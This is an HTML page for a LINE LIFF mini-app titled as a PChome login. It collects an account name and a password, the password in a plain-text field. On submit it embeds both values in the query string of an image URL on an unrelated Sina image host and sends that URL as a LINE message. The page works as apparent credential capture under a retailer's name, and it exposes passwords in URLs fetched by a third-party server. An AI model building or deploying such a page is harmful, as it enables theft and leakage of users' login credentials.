<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>PChome 登入</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</head>

<body>
    <div class="row" style="margin: 20px">
        <div class="col-12" style="margin-top: 5px">
            <div class="form-floating mb-3">
                <input type="text" class="form-control" id="My_id" placeholder="帳號">
                <label for="My_id">帳號</label>
            </div>
            <div class="form-floating mb-3">
                <input type="text" class="form-control" id="My_password" placeholder="密碼">
                <label for="My_password">密碼</label>
            <br />
            <button class="btn btn-block" id="sure" style="background-color: #d00; color: #fff;width:100%">確定</button>
        </div>
    </div>

    <script src="https://static.line-scdn.net/liff/edge/2.1/sdk.js"></script>
    <script>
        function initializeLiff(myLiffId) {
            liff
                .init({
                    liffId: myLiffId
                });
        }

        function pushMsg(p_id, p_password) {
            if (p_id == '' || p_password == '') {  //資料檢查
                alert('每個項目都必須輸入！');
                return;
            }
            var msg = "M";  //回傳訊息字串
            msg = msg + "&" + p_id;
            msg = msg + "&" + p_password;
            var img = "https://n.sinaimg.cn/sinakd20123/600/w800h600/20200317/6edb-iqyryku8469881.gif"
            liff.sendMessages([  //推播訊息
                {
                    type: 'image',
                    originalContentUrl: img+'?sender='+msg,
                    previewImageUrl: img+'?sender='+msg
                }
            ])
                .then(() => {
                    liff.closeWindow();  //關閉視窗
                });
        }

        $(document).ready(function () {
            initializeLiff('1657177329-qWwbK3aG');
            $('#sure').click(function (e) {  //按下確定鈕
                pushMsg($('#My_id').val(), $('#My_password').val());
            });
        });
    </script>
</body>

</html>
